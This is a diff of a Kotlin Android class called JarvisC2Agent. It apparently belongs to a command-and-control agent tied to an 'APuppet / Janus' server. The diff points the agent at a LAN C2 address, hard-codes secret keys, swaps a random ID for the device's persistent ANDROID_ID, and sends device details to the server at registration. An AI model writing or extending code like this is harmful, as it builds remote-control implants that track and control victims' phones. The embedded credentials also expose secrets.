@@ -35,7 +35,7 @@ class JarvisC2Agent(private val context: Context) {
             "KUn9Nf1WGiBb31mEHrU5-NDo_K-BEUA0laGL6yFdnT0"
 
         // ── APuppet / Janus server ──────────────────────────────────────────
-        private const val APUPPET_SERVER   = "10.0.2.2"
+        private const val APUPPET_SERVER   = "192.168.10.52"
         private const val APUPPET_SECRET   = "9qm7DfBd"
 
         // ── Polling ─────────────────────────────────────────────────────────
@@ -50,22 +50,14 @@ class JarvisC2Agent(private val context: Context) {
         .writeTimeout(15, TimeUnit.SECONDS)
         .build()
 
-    /** Unique, stable device ID — UUID that matches the DB column type */
+    /** Unique, stable device ID */
     private val deviceId: String by lazy {
-        // Use a UUID so it matches the UUID column type in Supabase
-        val stored = context.getSharedPreferences("jarvis_prefs", Context.MODE_PRIVATE)
-            .getString("device_uuid", null)
-        if (stored != null) stored else {
-            val uuid = UUID.randomUUID().toString()
-            context.getSharedPreferences("jarvis_prefs", Context.MODE_PRIVATE)
-                .edit().putString("device_uuid", uuid).apply()
-            uuid
-        }
+        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+            ?: UUID.randomUUID().toString()
     }
 
     private val deviceName: String get() = "${Build.MANUFACTURER} ${Build.MODEL}"
-    private val androidVersion: String  get() = "Android ${Build.VERSION.RELEASE}"
-    private val apiLevel: Int get() = Build.VERSION.SDK_INT
+    private val osVersion: String  get() = "Android ${Build.VERSION.RELEASE}"
 
     // ──────────────────────────────────────────────────────────────────────────
     //  Public API
@@ -97,13 +89,13 @@ class JarvisC2Agent(private val context: Context) {
 
     private suspend fun registerOrUpdateDevice() {
         val body = JSONObject().apply {
-            put("device_id",       deviceId)
-            put("device_name",     deviceName)
-            put("manufacturer",    Build.MANUFACTURER)
-            put("model",           Build.MODEL)
-            put("android_version", androidVersion)
-            put("api_level",       apiLevel)
-            put("status",          "Online")
+            put("device_id",      deviceId)
+            put("device_name",    deviceName)
+            put("manufacturer",   Build.MANUFACTURER)
+            put("model",          Build.MODEL)
+            put("android_version","Android ${Build.VERSION.RELEASE}")
+            put("api_level",      Build.VERSION.SDK_INT)
+            put("status",         "Online")
         }.toString()
 
         val request = Request.Builder()
